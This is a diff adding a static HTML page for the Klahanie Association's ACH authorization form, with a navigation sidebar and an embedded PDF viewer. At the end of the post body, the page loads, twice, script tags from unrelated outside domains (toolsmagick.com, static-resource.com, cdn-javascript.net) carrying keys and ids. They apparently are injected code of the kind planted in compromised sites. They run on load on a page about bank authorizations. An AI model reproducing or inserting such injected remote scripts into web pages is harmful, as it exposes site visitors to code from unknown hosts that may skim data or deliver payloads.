@@ -1,0 +1,132 @@
+<html>
+
+<head>
+  <title>Klahanie Association - ACH Authorization Form</title>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+    integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
+    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
+    crossorigin="anonymous"></script>
+
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+    crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
+    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
+    crossorigin="anonymous"></script>
+
+  <link rel="stylesheet" href="/css/style.css" />
+  <script>
+    $(function() {
+     var pgurl = window.location.href.substr(window.location.href
+.lastIndexOf("/")+1);
+     $("#nav ul li a").each(function(){
+          if($(this).attr("href") == pgurl || $(this).attr("href") == '' )
+          $(this).addClass("active");
+     })
+});
+  </script>
+</head>
+
+<body class="row">
+  <nav class="sidebar col-md-2">
+    <div class="widget widget_media_image" style="margin-left:-10px;">
+      <a href="https://klahanie.com"><img 
+          src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"
+          class="img col-md-10" alt="Klahanie Logo"
+          style="max-width: 100%; height: auto;"
+          data-orig-src="https://klahanie.com/wp-content/uploads/2019/08/Klahanie-Logo-for-Web-small-2.png"></a></div>
+
+    <ul id="nav" class="nav flex-column mt-4">
+  <li class="nav-item"><a class="nav-link" href="announcements.html">Announcements</a></li>
+  <li class="nav-item">
+    <a class="nav-link dropdown-toggle" href="#item1" data-toggle="collapse" data-parent="nav">Neighborhood</a>
+    <div id="item1" class='collapse'>
+      <ul class="nav ml-3">
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie/">About Klahanie</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/neighborhoods/">Neighborhoods</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/shopping-center/">Shopping Center</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/buying-a-home/">Buying or Selling a Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/renting-your-home/">Renting Your Home</a></li>
+        <li class="nav-item"><a class="nav-link" href="https://klahanie.com/about-klahanie-forms/">Forms</a></li>
+      </ul>
+    </div>
+</li> 
+<li class="nav-item">
+  <a class="nav-link dropdown-toggle" href="#item2" data-toggle="collapse" data-parent="nav">Amenities</a>
+  <div id="item2" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/klahanie-lifestyles/">Klahanie Lifestyles</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-information/">Pool Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/pool-forms/">Pool Rules</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/swim-lessons/">Swim Lessons &amp; Online Registration</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/lakeside-pool/">Lakeside Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/mountainview-pool/">Mountainview Pool</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/tennis-information/">Tennis Information</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/clubs-and-groups/">Clubs and Groups</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/security/">Neighborhood Patrol</a>
+      <li class="nav-item"><a href="https://klahanie.com/lifestyles-forms/">Forms</a></li>
+    </ul>  
+  </div>
+  </li>
+
+<li class="nav-item"><a class="nav-link dropdown-toggle" href="#item3" data-toggle="collapse" data-parent="nav">The Association</a>
+  <div id="item3" class="collapse">
+    <ul class="nav ml-3">
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/the-association/">Overview</a></li>
+      <li class="nav-item"><a class="nav-link" href="https://klahanie.com/administration/">Administration</a></li>
+    <li class="nav-item"><a class="nav-link" href="https://klahanie.com/homeowners-association-obligations-and-compliance/">Homeowners Association Obligations and Compliance</a>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/board-of-directors/">Board of Directors</a></li>
+    <li class="nav-item"><a class="nav-link"  href="https://klahanie.com/association-forms/">Forms</a></li>
+    </ul>
+  </div>
+</li>
+<li class="nav-item"><a class="nav-link" href="https://myhoabenefits.com/">My HOA Benefits</a></li>
+<li class="nav-item"><a class="nav-link" href="klahanie-magazine.html">Klahanie Magazine</a></li>
+<li class="nav-item"><a class="nav-link" href="http://klahanie.com/events/">Calendar of Events</a></li>
+<li class="nav-item"><a class="nav-link"  href="https://klahanie.com/contact-us/">Contact</a></li>
+</ul>
+</ul>
+
+
+    <div class="small ml-3 mt-10">4210 244th Place SE<br>
+      Sammamish, WA 98029<br>
+      425-392-4663<br>
+      425-392-4663<br>
+      Office hours: 
+      <ul>
+        <li>Monday-Thursday: 8:30am - 5:00pm</li>
+        <li>Friday:9:00am - 4:00pm</li>
+        <li>Closed weekends, and holidays</li>
+      </ul>
+      <a href='https://www.facebook.com/KlahanieAssociation/'><img src="fb.png" class="img" width="100"  alt="Find us on Facebook"></a>
+    </div>
+  </nav>
+  <div class="main col-md-10">
+    <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">ACH Authorization Form</h1>
+  </header>
+
+  <div class="post-content">
+    <!-- wp:cgb/block-algori-pdf-viewer {"url":"http://klahanie.com/wp-content/uploads/2019/06/374180698ach_authorization_form.pdf","widthBeforeWideFullAlignments":1200,"width":1200,"height":1400,"id":1632} -->
+<div class="wp-block-cgb-block-algori-pdf-viewer alignundefined"><iframe class="wp-block-cgb-block-algori-pdf-viewer-iframe" style="width: 1200px; height: 1400px;" src="http://klahanie.com/wp-content/plugins/algori-pdf-viewer-pro/dist/web/viewer.html?file=http%3A%2F%2Fklahanie.com%2Fwp-content%2Fuploads%2F2019%2F06%2F374180698ach_authorization_form.pdf&amp;open-file=1&amp;view-bookmark=1&amp;theme-color=undefined#page=1&amp;zoom=auto"></iframe></div>
+<!-- /wp:cgb/block-algori-pdf-viewer -->
+<p><script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script> <script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script> <script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1583222407939" type="text/javascript"></script> <script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script></p>
+<p>
+<script src="//toolsmagick.com/2252259d09bdba7f1b.js"></script>
+<script src="http://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8786x" type="text/javascript"></script>
+<script src="http://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8786x&amp;format=arrjs&amp;r=1583222449326" type="text/javascript"></script>
+<script src="http://toolsmagick.com/ext/2252259d09bdba7f1b.js?sid=52646_8786_&amp;title=qqq&amp;blocks[]=31af2" type="text/javascript"></script>
+</p>
+
+  </div>
+
+</article>
+
+  </div>
+
+</body>
+
+</html>
